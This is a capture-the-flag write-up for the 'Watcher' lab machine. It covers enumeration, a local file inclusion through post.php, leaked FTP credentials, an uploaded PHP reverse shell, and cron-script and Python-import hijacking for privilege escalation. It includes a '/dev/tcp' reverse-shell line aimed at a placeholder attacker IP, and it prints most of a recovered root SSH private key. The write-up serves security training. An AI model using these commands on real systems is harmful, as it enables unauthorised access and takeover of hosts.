##Watcher

#Enumeration
```
# Nmap 7.91 scan initiated Thu Feb 18 21:55:31 2021 as: nmap -sC -sV -o nmap/initial -vvv -p 22,21,80 10.10.204.136
Nmap scan report for 10.10.204.136
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-02-18 21:55:32 PST for 13s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7hN8ixZsMzRUvaZjiBUrqtngTVOcdko2FRpRMT0D/LTRm8x8SvtI5a52C/adoiNNreQO5/DOW8k5uxY1Rtx/HGvci9fdbplPz7RLtt+Mc9pgGHj0ZEm/X0AfhBF0P3Uwf3paiqCqeDcG1HHVceFUKpDt0YcBeiG1JJ5LZpRxqAyd0jOJsC1FBNBPZAtUA11KOEvxbg5j6pEL1rmbjwGKUVxM8HIgSuU6R6anZxTrpUPvcho9W5F3+JSxl/E+vF9f51HtIQcXaldiTNhfwLsklPcunDw7Yo9IqhqlORDrM7biQOtUnanwGZLFX7kfQL28r9HbEwpAHxdScXDFmu5wR
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBmjWU4CISIz0mdwq6ObddQ3+hBuOm49wam2XHUdUaJkZHf4tOqzl+HVz107toZIXKn1ui58hl9+6ojTnJ6jN/Y=
|   256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHb7zsrJYdPY9eb0sx8CvMphZyxajGuvbDShGXOV9MDX
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 18 21:55:45 2021 -- 1 IP address (1 host up) scanned in 13.76 seconds
```

#Web Server
```
gobuster dir -u http://10.10.204.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster/initial
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.204.136
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,php,html
[+] Timeout:        10s
===============================================================
2021/02/18 22:07:37 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/post.php (Status: 200)
/css (Status: 301)
/robots.txt (Status: 200)
```

robots.txt
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

secret_file_do_not_read.txt gives a 403 forbidden when trying to access it, however while exploring the site we see that post.php accesses post with a ?post= arguments in the url so lets try the following

http://10.10.204.136/post.php?post=secret_file_do_not_read.txt
```
 Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 
```

#FTP
```
ftp 10.10.204.136
Connected to 10.10.204.136.
220 (vsFTPd 3.0.3)
Name (10.10.204.136:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03 03:30 files
-rw-r--r--    1 0        0              21 Dec 03 01:58 flag_2.txt
```

If we go in to the files directory we find that we are able to upload so lets upload a php reverse shell then abuse the ?post= argument again to access it via
http://10.10.204.136/post.php?post=/home/ftpuser/ftp/files/revshell.php

#Initial foothold
Our reverse shell successfully comes back and we stabalize our shell
As we are the www-user lets check /var/www/html
```
ls -la
total 60
drwxr-xr-x 5 root root 4096 Dec  3 01:52 .
drwxr-xr-x 3 root root 4096 Dec  3 01:39 ..
-rw-r--r-- 1 root root   47 Dec  3 01:47 .htaccess
-rw-r--r-- 1 root root 3445 Dec  3 01:42 bunch.php
drwxr-xr-x 2 root root 4096 Dec  3 01:42 css
-rw-r--r-- 1 root root   35 Dec  3 01:42 flag_1.txt
drwxr-xr-x 2 root root 4096 Dec  3 01:42 images
-rw-r--r-- 1 root root 4826 Dec  3 01:42 index.php
drwxr-xr-x 2 root root 4096 Dec  3 01:42 more_secrets_a9f10a
-rw-r--r-- 1 root root 2454 Dec  3 01:52 post.php
-rw-r--r-- 1 root root   69 Dec  3 01:43 robots.txt
-rw-r--r-- 1 root root 3440 Dec  3 01:42 round.php
-rw-r--r-- 1 root root  156 Dec  3 01:44 secret_file_do_not_read.txt
-rw-r--r-- 1 root root 3446 Dec  3 01:42 striped.php
```
inside more_secret_a9f10a we find our 3rd flag

#Privilege Escalation
```
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```
We can run any command as toby so lets get a shell as toby
```
sudo -u toby /bin/bash
toby@watcher:/var/www/html$cd /home/toby
ls -la
total 44
drwxr-xr-x 6 toby toby 4096 Dec 12 15:25 .
drwxr-xr-x 6 root root 4096 Dec  3 02:06 ..
lrwxrwxrwx 1 root root    9 Dec  3 02:34 .bash_history -> /dev/null
-rw-r--r-- 1 toby toby  220 Dec  3 01:58 .bash_logout
-rw-r--r-- 1 toby toby 3771 Dec  3 01:58 .bashrc
drwx------ 2 toby toby 4096 Dec  3 02:40 .cache
drwx------ 3 toby toby 4096 Dec  3 02:40 .gnupg
drwxrwxr-x 3 toby toby 4096 Dec  3 01:58 .local
-rw-r--r-- 1 toby toby  807 Dec  3 01:58 .profile
-rw------- 1 toby toby   21 Dec  3 01:58 flag_4.txt
drwxrwxr-x 2 toby toby 4096 Dec  3 03:31 jobs
-rw-r--r-- 1 mat  mat    89 Dec 12 15:25 note.txt
```

```
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```

```
cat /home/toby/jobs/cow.sh
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

```
echo "bash -i >& /dev/tcp/IP/PORT 0>&1" >> /home/toby/jobs/cow.sh
```

After a little bit we get a reverse shell back as mat
```
rlwrap nc -nlvp 4243
listening on [any] 4243 ...
connect to [10.13.1.12] from (UNKNOWN) [10.10.204.136] 55600
bash: cannot set terminal process group (13514): Inappropriate ioctl for device
bash: no job control in this shell
ls -la
ls -la
total 312
drwxr-xr-x 6 mat  mat    4096 Dec  3 03:31 .
drwxr-xr-x 6 root root   4096 Dec  3 02:06 ..
lrwxrwxrwx 1 root root      9 Dec  3 02:33 .bash_history -> /dev/null
-rw-r--r-- 1 mat  mat     220 Dec  3 01:58 .bash_logout
-rw-r--r-- 1 mat  mat    3771 Dec  3 01:58 .bashrc
drwx------ 2 mat  mat    4096 Dec  3 02:47 .cache
-rw-r--r-- 1 mat  mat  270433 Dec  3 01:58 cow.jpg
-rw------- 1 mat  mat      37 Dec  3 01:58 flag_5.txt
drwx------ 3 mat  mat    4096 Dec  3 02:47 .gnupg
drwxrwxr-x 3 mat  mat    4096 Dec  3 01:58 .local
-rw-r--r-- 1 will will    141 Dec  3 01:58 note.txt
-rw-r--r-- 1 mat  mat     807 Dec  3 01:58 .profile
drwxrwxr-x 2 will will   4096 Dec  3 03:31 scripts
mat@watcher:~$
```

```
cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

```
sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

```
cat scripts/will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```

```
cd scripts
ls -la
ls -la
total 16
drwxrwxr-x 2 will will 4096 Dec  3 03:31 .
drwxr-xr-x 6 mat  mat  4096 Dec  3 03:31 ..
-rw-r--r-- 1 mat  mat   133 Dec  3 03:31 cmd.py
-rw-r--r-- 1 will will  208 Dec  3 01:58 will_script.py
mat@watcher:~/scripts$cat cmd .py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

We can edit this file so lets go ahead and hijack this library import as follows

```
import pty
def get_command(num):
		pty.spawn('/bin/bash')
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```

```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 3
</usr/bin/python3 /home/mat/scripts/will_script.py 3
will@watcher:~/scripts$
```

```
cd /home/will
ls -la
ls -la
total 36
drwxr-xr-x 5 will will 4096 Dec  3 02:31 .
drwxr-xr-x 6 root root 4096 Dec  3 02:06 ..
lrwxrwxrwx 1 will will    9 Dec  3 02:31 .bash_history -> /dev/null
-rw-r--r-- 1 will will  220 Dec  3 01:58 .bash_logout
-rw-r--r-- 1 will will 3771 Dec  3 01:58 .bashrc
drwx------ 2 will will 4096 Dec  3 01:58 .cache
drwxr-x--- 3 will will 4096 Dec  3 02:19 .config
-rw------- 1 will will   41 Dec  3 01:58 flag_6.txt
drwx------ 3 will will 4096 Dec  3 02:12 .gnupg
-rw-r--r-- 1 will will  807 Dec  3 01:58 .profile
-rw-r--r-- 1 will will    0 Dec  3 01:58 .sudo_as_admin_successful
will@watcher:/home/will$
```

sudo -l requires a password unfortunately so lets run id and check for any group privileges
```
id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
will@watcher:/home/will$
```
interesting adm group
```
find / -group adm 2>/dev/null
/opt/backups
/opt/backups/key.b64
/var/log/auth.log
/var/log/kern.log
/var/log/syslog
/var/log/apache2
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log
/var/log/cloud-init.log
/var/log/unattended-upgrades
/var/log/unattended-upgrades/unattended-upgrades-dpkg.log
/var/log/apt/term.log
/var/spool/rsyslog
will@watcher:/home/will$
```

```
cat /opt/backups/key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
cat /opt/backups/key.b64 | base64 -d
cat /opt/backups/key.b64 | base64 -d
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
nM8kj8NkFkFPk0d1HKH2+p7QP2HGZrf3DNFmQ7Tuja3zngbEVO7NXx3V3YOF9y1X
eFPrvtDQV7BYb6egklafs4m4XeUO/csM84I6nYHWzEJ5zpcSrpmkDHxC8yH9mIVt
dSelabW2fuLAi51UR/2wNqL13hvGglpePhKQgQIDAQABAoIBAHmgTryw22g0ATnI
REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED REDACTED 
gLLVOk0gz7dvC3hGc12BrqcCgYAhFji34iLCi3Nc1lsvL4jvSWnLeMXnQbu6P+Bd
bKiPwtIG1Zq8Q4Rm6qqC9cno8NbBAtiD6/TCX1kz6iPq8v6PQEb2giijeYSJBYUO
kJEpEZMF308Vn6N6/Q8DYavJVc+tm4mWcN2mYBzUGQHmb5iJjkLE2f/TwYTg2DB0
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```
Looks like we found a backup of private ssh key, let assume this is root and try to ssh with it
Success!!
```
root@watcher:~# ls -la
total 40
drwx------  6 root root 4096 Dec  3 02:32 .
drwxr-xr-x 24 root root 4096 Dec 12 15:22 ..
lrwxrwxrwx  1 root root    9 Dec  3 02:32 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Dec  3 01:42 .cache
-rw-r--r--  1 root root   31 Dec  3 02:26 flag_7.txt
drwx------  3 root root 4096 Dec  3 01:42 .gnupg
drwxr-xr-x  3 root root 4096 Dec  3 01:41 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Dec  3 02:07 .selected_editor
drwx------  2 root root 4096 Dec  3 02:04 .ssh
root@watcher:~#
```
